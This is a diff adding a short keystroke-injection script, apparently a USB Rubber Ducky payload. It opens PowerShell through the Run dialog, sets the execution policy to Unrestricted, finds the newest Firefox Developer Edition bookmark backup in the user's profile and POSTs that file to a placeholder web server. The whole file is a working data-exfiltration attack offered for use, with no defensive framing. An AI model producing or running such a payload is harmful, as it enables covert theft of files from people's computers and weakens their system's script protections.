@@ -1,0 +1,25 @@
+DELAY 100000
+GUI r
+DELAY 1000
+STRING powershell.exe
+ENTER
+DELAY 1000
+STRING Set-ExecutionPolicy -Scope CurrentUser Unrestricted
+ENTER 
+DELAY 1000
+STRING $app = $env:APPDATA
+ENTER
+DELAY 1000
+STRING $uri=<webserver>
+ENTER
+DELAY 1000
+STRING $dir = $app + "\Mozilla\Firefox\Profiles\*.dev-edition-default\bookmarkbackups"
+ENTER
+DELAY 1000
+STRING Set-Location $dir
+ENTER
+DELAY 1000
+STRING $latest = Get-ChildItem | Sort-Object LastAccessTime -Descending | Select-Object -First 1
+ENTER
+DELAY 1000
+STRING Invoke-RestMethod -Uri $uri -Method Post -InFile $latest.FullName 
